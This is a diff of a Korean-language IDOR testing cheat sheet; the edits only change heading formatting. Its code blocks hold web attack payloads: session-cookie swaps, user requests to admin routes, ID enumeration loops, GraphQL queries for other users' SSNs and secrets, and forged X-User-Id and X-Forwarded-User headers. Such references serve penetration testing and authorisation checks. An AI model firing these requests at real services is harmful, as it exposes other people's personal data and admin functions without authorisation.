@@ -2,7 +2,7 @@
 
 ### 기본 페이로드
 
-**수평 IDOR (다른 사용자 리소스 접근):**
+#### 수평 IDOR (다른 사용자 리소스 접근)
 ```
 # 1. 계정 A로 자신 ID 획득
 GET /api/orders → response: { id: 123, ... }
@@ -12,14 +12,14 @@ GET /api/orders/123  Cookie: session=B
 → 200 + 계정 A 데이터 반환 시 확인됨
 ```
 
-**수직 IDOR (관리자 라우트):**
+#### 수직 IDOR (관리자 라우트)
 ```
 GET  /api/admin/users        Cookie: session=USER
 DELETE /api/admin/users/999  Cookie: session=USER
 PUT  /api/admin/config       Cookie: session=USER
 ```
 
-**리소스 enumeration (순차 ID/UUID):**
+#### 리소스 enumeration (순차 ID/UUID)
 ```
 # 순차 ID
 for i in $(seq 1 100); do
@@ -53,18 +53,18 @@ POST /api/orders/batch  Cookie: session=B
 { node(id: "QWRtaW46MQ==") { ... on Admin { secrets } } }
 ```
 
-**중첩 resolver IDOR (GraphQL field-level):**
+#### 중첩 resolver IDOR (GraphQL field-level)
 ```graphql
 { user(id: "OWN") { posts { owner { email phone ssn } } } }
 ```
 
-**WebSocket 채널 IDOR:**
+#### WebSocket 채널 IDOR
 ```javascript
 const ws = new WebSocket('wss://target/ws');
 ws.onopen = () => ws.send(JSON.stringify({type:'subscribe', channel:'/user/OTHER_ID/notifications'}));
 ```
 
-**Email/Phone 기반 enumeration:**
+#### Email/Phone 기반 enumeration
 ```
 GET /api/users?email=victim@example.com
 GET /api/users?phone=01012345678
@@ -89,7 +89,7 @@ GET /api/profile?username=admin
 | Header 기반 사용자 ID 신뢰 | `X-User-Id`, `X-User-Email` 같은 신뢰 헤더 변조 |
 | 404 vs 403 oracle | 응답 차이로 리소스 존재 여부 추정 (enumeration) |
 
-**Authorization 헤더 swap:**
+#### Authorization 헤더 swap
 ```
 # 토큰 swap
 curl -H "Authorization: Bearer <token_B>" -H "X-User-Id: <user_A_id>" "https://target/api/profile"
@@ -101,7 +101,7 @@ curl -H "Cookie: session=B" -H "X-Forwarded-User: admin" "https://target/api/adm
 curl -H "Authorization: Bearer X" -H "Cookie: session=B" ...
 ```
 
-**Cursor/Pagination decode:**
+#### Cursor/Pagination decode
 ```
 # Base64 cursor에 사용자 컨텍스트 노출
 echo "eyJ1c2VyX2lkIjoxMjMsIm9mZnNldCI6MH0=" | base64 -d
